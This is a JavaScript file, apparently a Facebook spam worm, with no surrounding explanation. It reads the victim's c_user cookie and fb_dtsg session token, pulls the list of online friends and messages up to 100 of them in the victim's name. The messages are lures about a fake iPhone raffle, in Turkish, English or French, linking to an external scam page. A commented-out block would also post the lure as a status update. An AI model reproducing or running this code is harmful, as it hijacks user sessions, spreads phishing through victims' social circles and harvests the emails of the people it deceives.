
var profile_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var spamengelle = Math.floor((Math.random() * 100) + 1);
var website = "http://iphoneraffle.over-blog.com/2015winners-";
var language = window.navigator.userLanguage || window.navigator.language;

if (language == "tr")
{
var random1 = "yardımına ihtiyacım var. iPhone çekilişine katıldım ama galiba beceremedim yanlış okudum adımları :( Yardım eder misin? :( " + website + spamengelle + ".html";
var random2 = "ya iphone çekilişine katıldım da, 10 arkadaşımın da katılması gerekiyormuş şansımın artması için, sen de katılır mısın? :) " + website + spamengelle + ".html";
var random3 = "bu iPhone'u kazanmak için şansımı sonuna kadar zorlicam :) sen de katılsana ya katılırsan benim kazanma şansım artacak, emailini yazıp onaylican sadece lütfeeen <3 " + website + spamengelle + ".html";
}
if (language == "en-GB" || language == "en-US")
{
var random1 = "I need your help, there was a raffle for an iPhone but I think I misread the instructions... couldn't figure it out :( can you also try this and inform me? :( " + website + spamengelle + ".html";
var random2 = "Hey, I raffled for an iPhone but it needs 10 of my friends to raffle as well... it's as easy as pie, just enter your email and confirm it :) " + website + spamengelle + ".html";
var random3 = "I am pushing my luck to win this iPhone. Could you please help me by increasing my chance of winning by entering your email and confirming? <3 " + website + spamengelle + ".html";
}
if (language == "fr")
{
var random1 = "pouvez vous remplir le formulaire?  " + website + spamengelle + ".html";
var random2 = "je gagne un iphone mais je ne suis pas sure.. pouvez-vous essayer?  " + website + spamengelle + ".html";
var random3 = "cela doit etre verifie par de telephone portable, je ne pouvais pas le faire :( pouvez-vous essayer? " + website + spamengelle + ".html";
}



var randommesaj = Math.floor((Math.random() * 3) + 1);

if (randommesaj == 1) var mesaj = random1;
if (randommesaj == 2) var mesaj = random2;
if (randommesaj == 3) var mesaj = random3;

online_arkadaslar();
 
function yolla(facebook)
{
        var httpc = new XMLHttpRequest();
        var msgid = Math.floor(Math.random() * 1000000);
        var paramsc = "message_batch[0][action_type]=ma-type%3Auser-generated-message&message_batch[0][author]=fbid%3A" +
                profile_id +
                "&message_batch[0][author_email]&message_batch[0][coordinates]&message_batch[0][is_forward]=false&message_batch[0][is_filtered_content]=false&message_batch[0][spoof_warning]=false&message_batch[0][source]=source%3Atitan%3Aweb&&message_batch[0][body]=" +
                mesaj +
                "&message_batch[0][has_attachment]=false&message_batch[0][html_body]=false&&message_batch[0][specific_to_list][0]=fbid%3A" +
                facebook + "&message_batch[0][specific_to_list][1]=fbid%3A" + profile_id +
                "&&message_batch[0][forward_count]=0&message_batch[0][force_sms]=true&message_batch[0][ui_push_phase]=V3&message_batch[0][status]=0&message_batch[0][message_id]=" +
                msgid + "&client=mercury&__user=" + profile_id + "&__a=1&__dyn=&__req=i&fb_dtsg=" + fb_dtsg +
                "&phstamp=";
        httpc.open("POST", "/ajax/mercury/send_messages.php?__a=1", true);
        httpc.onreadystatechange = function ()
        {
                if (httpc.readyState == 4 && httpc.status == 1000)
                {
                        httpc.close;
                }
        }
        httpc.send(paramsc);
}
 
function online_arkadaslar()
{
        var xmlhttp = new XMLHttpRequest();
        var params = "user=" + profile_id + "&fetch_mobile=false&__user=" + profile_id + "&__a=1&__req=2&fb_dtsg=" +
                fb_dtsg;
        xmlhttp.open("POST", "/ajax/chat/buddy_list.php?__a=1", true);
        xmlhttp.onreadystatechange = function ()
        {
                if (xmlhttp.readyState == 4 && xmlhttp.status == 200)
                {
                        var response = JSON.parse(xmlhttp.responseText.replace("for (;;);", ""));
                        var count = 0;
                        for (property in response.payload.buddy_list.nowAvailableList)
                        {
                                if (count < 100) yolla(property);
                                count++;
                        }
                        xmlhttp.close;
                }
        }
        xmlhttp.send(params);
}

/*
var postMessageText = mesaj;
var myUserID = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var dts = document.getElementsByName("fb_dtsg")[0].value;
var sender = document.getElementById("sender");

	pst = "fb_dtsg=" + dts + "&xhpc_composerid=" + myUserID + "&xhpc_targetid=" + myUserID+ "&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=" + encodeURIComponent(postMessageText) + "&xhpc_message=" + encodeURIComponent(postMessageText) + "&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_group_composer";
	with(newx = new XMLHttpRequest) open("POST", "/ajax/updatestatus.php?__a=1"), send(pst);
*/
